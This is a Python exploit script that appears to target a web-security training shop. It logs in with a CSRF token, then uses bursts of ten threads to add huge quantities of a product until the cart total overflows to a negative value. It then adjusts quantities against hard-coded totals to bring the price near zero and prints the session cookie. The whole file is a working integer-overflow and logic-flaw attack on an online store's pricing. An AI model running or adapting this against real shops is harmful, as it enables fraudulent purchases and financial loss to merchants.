import requests
import argparse
import threading
from queue import Queue
from bs4 import BeautifulSoup
import time


parser = argparse.ArgumentParser()
parser.add_argument("-t", dest="target", help="target")
parser.add_argument("-u", dest="user", help="user")
parser.add_argument("-p", dest="password", help="password")
args = parser.parse_args()

url = args.target
user = args.user
password = args.password


signin_url = url+"/login"
cart_url = url+"/cart"
checkout_url = url+"/cart/checkout"
jacket_url = url+"/product?productId=1"
snow_url = url+"/product?productId=4"

def get_csrf(content):
	soup = BeautifulSoup(content, 'lxml')
	csrftoken = soup.find('input', dict(name='csrf'))['value']
	return csrftoken

def check_value():
	value = check_cart()
	if value > -1917142.96 and value < 100:
		print(f"VAlue {value}")
		parameters = {"productId": 1,"redir": "PRODUCT","quantity": 10}
		print(parameters)

	print(value)
	if float(value) < 100 and float(value) > 0:
		print(f"FOUND IT: {value}")
		exit()


def get_jacket(parameters):
	s.post(cart_url, data=parameters)
	
def check_cart():
	r = s.get(cart_url)
	soup = BeautifulSoup(r.text, 'lxml')
	value = soup.find_all('th',)
	value = value[5].text.strip()
	value = value.replace("$", "")
	value = float(value)
	return value
def print_value():	
	value = check_cart()
	print(value)

def checkout():
	r = s.get(cart_url)
	csrftoken = get_csrf(r.text)
	parameters = {"csrf": csrftoken}
	s.post(checkout_url, data=parameters)

def sign_in():
	r = s.get(signin_url)
	csrftoken = get_csrf(r.text)
	parameters = {"csrf": csrftoken,"username": user, "password": password}
	s.post(signin_url, data=parameters)

def thread(parameters):
	t1 = threading.Thread(target=get_jacket, args=(parameters,))
	t2 = threading.Thread(target=get_jacket, args=(parameters,))
	t3 = threading.Thread(target=get_jacket, args=(parameters,))
	t4 = threading.Thread(target=get_jacket, args=(parameters,))
	t5 = threading.Thread(target=get_jacket, args=(parameters,))
	t6 = threading.Thread(target=get_jacket, args=(parameters,))
	t7 = threading.Thread(target=get_jacket, args=(parameters,))
	t8 = threading.Thread(target=get_jacket, args=(parameters,))
	t9 = threading.Thread(target=get_jacket, args=(parameters,))
	t10 = threading.Thread(target=get_jacket, args=(parameters,))

	t1.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
	t6.start()
	t7.start()
	t8.start()
	t9.start()
	t10.start()


	t1.join()
	t2.join()
	t3.join()
	t4.join()
	t5.join()
	t6.join()
	t7.join()
	t8.join()
	t9.join()
	t10.join()




s = requests.Session()

sign_in()
parameters = {"productId": 1,"redir": "PRODUCT","quantity": 99}
boole = True
while boole:
	thread(parameters)
	value = check_cart()
	if value < 0 and value > -1000000:
		boole = False

print_value()

while True:
	get_jacket(parameters)
	value = check_cart()
	if value == -64060.96:
		parameters = {"productId": 1,"redir": "PRODUCT","quantity": 10}
	if value == -10580.96:
		parameters = {"productId": 1,"redir": "PRODUCT","quantity": 5}
	if value == -3895.96:
		parameters = {"productId": 1,"redir": "PRODUCT","quantity": 1}	
	if value == -1221.96:
		parameters = {"productId": 4,"redir": "PRODUCT","quantity": 13}	
		get_jacket(parameters)
		cookie = s.cookies.get_dict()
		cookie = cookie.get('session')
		print(cookie)
		exit()